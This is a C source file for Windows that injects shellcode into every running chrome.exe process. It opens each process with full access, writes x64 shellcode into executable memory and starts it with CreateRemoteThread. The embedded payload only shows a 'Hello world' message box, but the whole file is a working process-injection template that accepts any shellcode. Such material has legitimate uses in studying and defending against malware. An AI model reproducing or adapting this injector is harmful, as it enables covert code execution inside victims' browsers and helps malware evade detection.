#include <stdio.h> // Standard I/O
#include <windows.h> //WINAPI
#include <tlhelp32.h>// PID snapshots

int main() {
	DWORD  threadid;
	DWORD PID;

	//messagebox
	    char shellcode[] =  "\x48\x83\xEC\x28\x48\x83\xE4\xF0\x48\x8D\x15\x66\x00\x00\x00"
                        "\x48\x8D\x0D\x52\x00\x00\x00\xE8\x9E\x00\x00\x00\x4C\x8B\xF8"
                        "\x48\x8D\x0D\x5D\x00\x00\x00\xFF\xD0\x48\x8D\x15\x5F\x00\x00"
                        "\x00\x48\x8D\x0D\x4D\x00\x00\x00\xE8\x7F\x00\x00\x00\x4D\x33"
                        "\xC9\x4C\x8D\x05\x61\x00\x00\x00\x48\x8D\x15\x4E\x00\x00\x00"
                        "\x48\x33\xC9\xFF\xD0\x48\x8D\x15\x56\x00\x00\x00\x48\x8D\x0D"
                        "\x0A\x00\x00\x00\xE8\x56\x00\x00\x00\x48\x33\xC9\xFF\xD0\x4B"
                        "\x45\x52\x4E\x45\x4C\x33\x32\x2E\x44\x4C\x4C\x00\x4C\x6F\x61"
                        "\x64\x4C\x69\x62\x72\x61\x72\x79\x41\x00\x55\x53\x45\x52\x33"
                        "\x32\x2E\x44\x4C\x4C\x00\x4D\x65\x73\x73\x61\x67\x65\x42\x6F"
                        "\x78\x41\x00\x48\x65\x6C\x6C\x6F\x20\x77\x6F\x72\x6C\x64\x00"
                        "\x4D\x65\x73\x73\x61\x67\x65\x00\x45\x78\x69\x74\x50\x72\x6F"
                        "\x63\x65\x73\x73\x00\x48\x83\xEC\x28\x65\x4C\x8B\x04\x25\x60"
                        "\x00\x00\x00\x4D\x8B\x40\x18\x4D\x8D\x60\x10\x4D\x8B\x04\x24"
                        "\xFC\x49\x8B\x78\x60\x48\x8B\xF1\xAC\x84\xC0\x74\x26\x8A\x27"
                        "\x80\xFC\x61\x7C\x03\x80\xEC\x20\x3A\xE0\x75\x08\x48\xFF\xC7"
                        "\x48\xFF\xC7\xEB\xE5\x4D\x8B\x00\x4D\x3B\xC4\x75\xD6\x48\x33"
                        "\xC0\xE9\xA7\x00\x00\x00\x49\x8B\x58\x30\x44\x8B\x4B\x3C\x4C"
                        "\x03\xCB\x49\x81\xC1\x88\x00\x00\x00\x45\x8B\x29\x4D\x85\xED"
                        "\x75\x08\x48\x33\xC0\xE9\x85\x00\x00\x00\x4E\x8D\x04\x2B\x45"
                        "\x8B\x71\x04\x4D\x03\xF5\x41\x8B\x48\x18\x45\x8B\x50\x20\x4C"
                        "\x03\xD3\xFF\xC9\x4D\x8D\x0C\x8A\x41\x8B\x39\x48\x03\xFB\x48"
                        "\x8B\xF2\xA6\x75\x08\x8A\x06\x84\xC0\x74\x09\xEB\xF5\xE2\xE6"
                        "\x48\x33\xC0\xEB\x4E\x45\x8B\x48\x24\x4C\x03\xCB\x66\x41\x8B"
                        "\x0C\x49\x45\x8B\x48\x1C\x4C\x03\xCB\x41\x8B\x04\x89\x49\x3B"
                        "\xC5\x7C\x2F\x49\x3B\xC6\x73\x2A\x48\x8D\x34\x18\x48\x8D\x7C"
                        "\x24\x30\x4C\x8B\xE7\xA4\x80\x3E\x2E\x75\xFA\xA4\xC7\x07\x44"
                        "\x4C\x4C\x00\x49\x8B\xCC\x41\xFF\xD7\x49\x8B\xCC\x48\x8B\xD6"
                        "\xE9\x14\xFF\xFF\xFF\x48\x03\xC3\x48\x83\xC4\x28\xC3";


	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	////printf("(-) Snapshot created \n");

	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32);
	//printf("(-) Process entry initialized \n");
	if (Process32First(hSnapshot, &pe32)) {
		do {
			if (strcmp(pe32.szExeFile, "chrome.exe") == 0) {
				//OpenProcess(Permission,child inherit the process, process id)
				//printf("(-) Notepad process found \n");
				PID = pe32.th32ProcessID;
				HANDLE Process = OpenProcess(PROCESS_ALL_ACCESS,FALSE,PID);
				if(Process==NULL){
					//printf("(-)Process search failed: " );
					//printf("%lu \n", GetLastError());
				}
				//printf("(-) Process search successfully executed \n");
			//--------------------------------------------------------------------
			//----------------------------------------------------------------------
			// Allocate memory in the target process
				LPVOID * memory = VirtualAllocEx(Process, NULL, sizeof(shellcode)+1, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
				if(memory==NULL){
					//printf("(-) Memory allocation failed: %lu \n", GetLastError());
				}
				//printf("(-) Memory allocation successfully executed \n");
			// write shellcode to the allocated memory
				WriteProcessMemory(Process, memory, shellcode, sizeof(shellcode)+1, NULL);

			//------------------------------------------------------------------------------------
			// CreateRemoteThread(Process,whether child process inherit the handle (null = false).inital size of stack (0 if regular), lpstartaddress (the function being executed)  )
			HANDLE RemoteThread = CreateRemoteThread(Process, NULL, 0, (LPTHREAD_START_ROUTINE) memory, NULL, 0, &threadid);
			SetThreadPriority(RemoteThread, THREAD_PRIORITY_HIGHEST);
			if(RemoteThread==NULL){
				//printf("(-) Create thread failed: %lu \n", GetLastError());
			}
			//printf("(-) Create thread sucessfully executed \n");
		//------------------------------------------------------------------------------------
		
			WaitForSingleObject(RemoteThread,INFINITE);

			//printf("(-) Thread has successfully executed \n");
			VirtualFreeEx(memory,0,MEM_RELEASE);

			//printf("(-) Thread has been terminated \n");


				}
		} while (Process32Next(hSnapshot, &pe32));

	};

	CloseHandle(hSnapshot);
	//printf("(-) Snapshot handle closed \n");

	return 0;
}





	